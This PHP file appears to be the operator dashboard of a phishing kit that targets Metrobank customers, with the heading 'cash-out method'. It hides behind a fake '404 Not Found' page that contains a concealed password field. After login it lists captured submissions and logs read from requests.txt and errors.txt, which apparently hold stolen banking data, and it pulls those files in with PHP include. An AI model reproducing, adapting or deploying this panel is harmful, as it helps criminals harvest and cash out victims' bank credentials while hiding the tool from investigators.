<?php
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);
$password = "augar_pogi";


if(!empty($password) and $_SESSION[$sessioncode] != $password){
      
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "

<html><head>
<title>404 Not Found</title>
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
</head><body>
<form method=post><input type='password' name='pass'style='border:none;float:right;'></form>
</body></html>
        ";
        exit;        
    }
}
?>

<!DOCTYPE html>
<html>
<head>
  <title>Metrobank Panel</title>



  <script src="clipboard.min.js"></script>
</head>
<body bgcolor="black">
  <style type="text/css">
::-webkit-scrollbar {width: 10px;}
::-webkit-scrollbar-track {}
::-webkit-scrollbar-thumb { background:lime; }
::-webkit-scrollbar-thumb:hover {background: green;}
    *{
        font-family: "Lucida Console", Courier, monospace;
        box-sizing: border-box;
    }
    #visitor-panel{
      background: black;
      border: 1px solid lime;
      padding-left:1%;
      padding-bottom:1%;
      margin:1%;
      width: 1500px;
      color: lime;
      /**float: left;**/
      height:180px;

    }
        #visitor-ip{
      background: black;
      border: 1px solid lime;
      padding-left:1%;
      padding-bottom:1%;
      margin:1%;
      width: 1500px;
      color: lime;
       overflow: scroll;   
        overflow-x: hidden; 
      height:140px;
      font-size: 13px;
      /**float: left;**/

    }



    #title{
      color:lime;
      margin-left: 44px;
      border-left:5px solid gray;
      padding-left: 4px;
    }


    #login{
        overflow: scroll;
        height: 120px;
        overflow-x: hidden; 
       
    }

 
    #panel::after{
      content: "";
      clear: both;
      display: table;
    }

  </style>
    <h1 id="title">METROBANK<i style="font-size: 15px;color: gray;">cash-out method</i> </h1>
        <div id="panel">

 <p style="color:gray;padding-left: 40px;">Requests: <?php 
        $file = "requests.txt";
        $no_of_lines =floor(count(file($file)));
        echo $no_of_lines;
        ?></p>
 

      </div>

    <div id="panel">



   <div id="visitor-ip">
       
           <div id="view">


       <?php 
       $filex = "requests.txt";
       if(floor(count(file($filex))) < 1){
        echo "<h1>NO REQUESTS</h1>";

       }else{
        include 'requests.txt';
       }
       
       ?>


           </div>
         </div>
 <p style="color:gray;padding-left: 40px;">LOGS</p>
   <div id="visitor-panel">
 <br>
           <div id="login">

       <?php 
       $filef = "errors.txt";
       if(floor(count(file($filef))) < 1){
        echo "<h1>NO LOGS</h1>";

       }else{
        include 'errors.txt';
       }
       
       ?>
           </div>

   </div>





    </div>
</body>
</html>